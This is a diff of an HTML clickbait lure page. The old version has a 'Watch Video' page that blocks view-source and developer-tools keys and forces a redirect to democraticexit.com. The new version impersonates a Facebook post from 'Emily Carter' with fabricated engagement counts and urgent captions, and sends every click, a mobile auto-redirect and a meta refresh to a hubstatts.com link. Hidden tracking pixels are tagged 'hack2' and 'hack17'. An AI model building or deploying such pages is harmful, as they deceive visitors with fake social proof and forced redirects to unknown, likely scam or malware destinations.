@@ -1,114 +1,290 @@
-  <!DOCTYPE html>
-  <html lang="en">
-  <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Watch Video</title>
-    <style>
-      body {
-        font-family: Arial, sans-serif;
-        background: #000;
-        color: #fff;
-        text-align: center;
-        padding: 20px;
-        margin: 0;
-      }
-      .container {
-        max-width: 100%;
-        width: 100%;
-        max-width: 700px;
-        margin: auto;
-        padding: 10px;
-        background: #111;
-        border-radius: 10px;
-      }
-      video {
-        width: 100%;
-        height: auto;
-        border-radius: 5px;
-        background: #000;
-      }
-      .buttons {
-        display: flex;
-        justify-content: space-between;
-        gap: 10px;
-        margin-top: 20px;
-      }
-      .btn {
-        flex: 1;
-        padding: 15px;
-        font-size: 18px;
-        border: none;
-        cursor: pointer;
-        border-radius: 5px;
-        text-decoration: none;
-        color: white;
-        text-align: center;
-      }
-      .watch-btn { background: #28a745; }
-      .download-btn { background: #dc3545; }
-      
-      @media (max-width: 600px) {
-        .container {
-          padding: 5px;
-        }
-      }
-    </style>
-  </head>
-  <body>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <div class="container">
-      <video controls autoplay muted>
-        <source src="https://cdn.videy.co/TC3pHkF1.mp4" type="video/mp4">
-        Your browser does not support the video tag.
-      </video>
-      <div class="buttons">
-        <a href="https://democraticexit.com/t8icwwwk1r?key=d549e1005156c11343a815c1aeed2339" class="btn watch-btn">▶ Watch Video</a>
-        <a href="https://democraticexit.com/t8icwwwk1r?key=d549e1005156c11343a815c1aeed2339" class="btn download-btn">⬇ Download</a>
-      </div>
-    </div>
+<title>Wait Until You See This 😳🔥</title>
 
-    <script>
-      setTimeout(() => {
-        window.location.href = "https://democraticexit.com/t8icwwwk1r?key=d549e1005156c11343a815c1aeed2339";
-      }, 10000);
+<meta property="og:title" content="Wait Until You See This 😳🔥">
+<meta property="og:description" content="This video is going viral right now 👀">
+<meta property="og:image" content="https://i.imgur.com/2Ye5zOC.jpg">
+<meta property="og:url" content="https://joyfulalva-18023b.netlify.app/">
+<meta property="og:type" content="website">
 
-      document.addEventListener("contextmenu", event => event.preventDefault());
-      
-      document.addEventListener("keydown", function(event) {
-          if (
-              event.ctrlKey && 
-              (event.key.toLowerCase() === "u" || 
-              event.key.toLowerCase() === "i" || 
-              event.key.toLowerCase() === "j" || 
-              event.key.toLowerCase() === "s") || 
-              event.key === "F12"
-          ) {
-              event.preventDefault();
-          }
-      });
-    </script>
+<style>
 
-    <!-- Histats Tracking Code -->
-    <script type="text/javascript">
-      var _Hasync = _Hasync || [];
-      _Hasync.push(['Histats.start', '1,4940555,4,0,0,0,00010000']);
-      _Hasync.push(['Histats.fasi', '1']);
-      _Hasync.push(['Histats.track_hits', '']);
-      (function() {
-          var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
-          hs.src = ('//s10.histats.com/js15_as.js');
-          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
-      })();
-    </script>
-    <noscript>
-      <a href="https://www.histats.com" target="_blank">
-        <img src="//sstatic1.histats.com/0.gif?4940555&101" alt="counter" border="0">
-      </a>
-    </noscript>
-    <!-- End Histats Tracking Code -->
-  </body>
-  </html>
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Arial,sans-serif;
+}
 
-  <meta http-equiv="REFRESH" content="50;URL=https://democraticexit.com/t8icwwwk1r?key=d549e1005156c11343a815c1aeed2339">
-<img src="//whos.amung.us/pingjs/?k=hack2 &t= Motivaciones♥♥  &x=youtube.com/" style="display:none" alt="">
+body{
+background:#f0f2f5;
+overflow-x:hidden;
+}
+
+.bg{
+position:fixed;
+width:100%;
+height:100%;
+background:url('https://i.imgur.com/2Ye5zOC.jpg') center/cover;
+filter:blur(15px);
+transform:scale(1.1);
+opacity:.3;
+z-index:-1;
+}
+
+.container{
+width:100%;
+max-width:720px;
+margin:auto;
+padding:8px 6px 100px;
+}
+
+.modal{
+background:#fff;
+border-radius:12px;
+overflow:hidden;
+box-shadow:0 10px 40px rgba(0,0,0,.25);
+margin-bottom:20px;
+}
+
+.top{
+padding:15px;
+font-size:26px;
+font-weight:bold;
+text-align:center;
+border-bottom:1px solid #ddd;
+}
+
+.post{
+display:flex;
+align-items:center;
+padding:12px;
+}
+
+.avatar{
+width:42px;
+height:42px;
+border-radius:50%;
+margin-right:10px;
+object-fit:cover;
+}
+
+.name{
+font-weight:bold;
+font-size:15px;
+}
+
+.time{
+font-size:13px;
+color:#777;
+margin-top:2px;
+}
+
+.video{
+position:relative;
+background:#000;
+cursor:pointer;
+}
+
+.video img{
+width:100%;
+display:block;
+}
+
+.overlay-text{
+position:absolute;
+top:15px;
+left:15px;
+right:15px;
+background:rgba(0,0,0,.65);
+color:white;
+padding:12px;
+border-radius:12px;
+font-size:22px;
+font-weight:bold;
+text-align:center;
+backdrop-filter:blur(4px);
+text-shadow:0 2px 8px rgba(0,0,0,.6);
+animation:pulseText 1.5s infinite;
+}
+
+@keyframes pulseText{
+0%{transform:scale(1);}
+50%{transform:scale(1.03);}
+100%{transform:scale(1);}
+}
+
+.play{
+position:absolute;
+top:50%;
+left:50%;
+transform:translate(-50%,-50%);
+font-size:90px;
+color:white;
+text-shadow:0 0 20px rgba(0,0,0,.5);
+}
+
+.caption{
+padding:14px;
+font-size:20px;
+font-weight:bold;
+}
+
+.stats{
+display:flex;
+justify-content:space-between;
+padding:0 14px 12px;
+font-size:14px;
+color:#666;
+}
+
+.actions{
+display:flex;
+justify-content:space-around;
+padding:12px;
+border-top:1px solid #eee;
+font-weight:bold;
+color:#666;
+}
+
+.gallery{
+padding:12px;
+display:grid;
+grid-template-columns:1fr;
+gap:14px;
+}
+
+.gallery img{
+width:100%;
+border-radius:14px;
+cursor:pointer;
+transition:.2s;
+max-height:650px;
+object-fit:cover;
+}
+
+.gallery img:hover{
+transform:scale(1.02);
+}
+
+.btn{
+position:fixed;
+bottom:20px;
+left:50%;
+transform:translateX(-50%);
+background:#1877f2;
+color:white;
+padding:15px 30px;
+border-radius:50px;
+text-decoration:none;
+font-weight:bold;
+z-index:99;
+box-shadow:0 5px 20px rgba(24,119,242,.5);
+animation:pulse 1.5s infinite;
+}
+
+@keyframes pulse{
+0%{transform:translateX(-50%) scale(1);}
+50%{transform:translateX(-50%) scale(1.05);}
+100%{transform:translateX(-50%) scale(1);}
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="bg"></div>
+
+<div class="container">
+
+<div class="modal">
+
+<div class="top">
+Trending Post
+</div>
+
+<div class="post">
+<img class="avatar" src="https://i.imgur.com/2Ye5zOC.jpg">
+
+<div>
+<div class="name">Emily Carter</div>
+<div class="time">12h · Public</div>
+</div>
+</div>
+
+<div class="video" onclick="goLink()">
+
+<img src="https://i.imgur.com/2Ye5zOC.jpg">
+
+<div class="overlay-text">
+WATCH BEFORE IT GETS DELETED 😳🔥
+</div>
+
+<div class="play">▶</div>
+
+</div>
+
+<div class="caption">
+Wait until the end 😳🔥
+</div>
+
+<div class="stats">
+<div>👍 8.9K</div>
+<div>1.2K comments</div>
+</div>
+
+<div class="actions">
+<div>👍 Like</div>
+<div>💬 Comment</div>
+<div>↗ Share</div>
+</div>
+
+<div class="gallery">
+<img src="https://i.imgur.com/IydKyBf.jpeg" onclick="goLink()">
+<div class="img-title">THIS VIDEO IS EVERYWHERE 🔥
+👀 CLICK PLAY TO WATCH IT 😵‍💫</div>
+<img src="https://i.imgur.com/aEft4Ws.jpeg" onclick="goLink()">
+<div class="img-title">THIS VIDEO IS GOING VIRAL 😵‍💫🔥</div>
+<img src="https://i.imgur.com/V9kvEsZ.jpeg" onclick="goLink()">
+THIS VIDEO IS EVERYWHERE 🔥
+👀 CLICK PLAY TO WATCH IT 😵‍💫
+<img src="https://i.imgur.com/V9kvEsZ.jpeg" onclick="goLink()">
+</div>
+
+</div>
+
+</div>
+
+<a class="btn" href="https://cbejfbb.hubstatts.com/s/b2e72753074ec" target="_blank">
+WATCH NOW FULL VIDEO CLICK HERE😳🔥
+</a>
+
+<script>
+
+function goLink(){
+window.location.href = "https://cbejfbb.hubstatts.com/s/b2e72753074ec";
+}
+
+if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+
+setTimeout(() => {
+
+window.location.href = "https://cbejfbb.hubstatts.com/s/b2e72753074ec";
+
+}, 5000);
+
+}
+
+</script>
+
+</body>
+</html>
+<meta http-equiv="REFRESH" content="05;URL=https://cbejfbb.hubstatts.com/s/b2e72753074ec">
+<img src="//whos.amung.us/pingjs/?k=hack17&t=PODERRRRR💯💯&x=https://www.facebook.com" style="display:none">
+
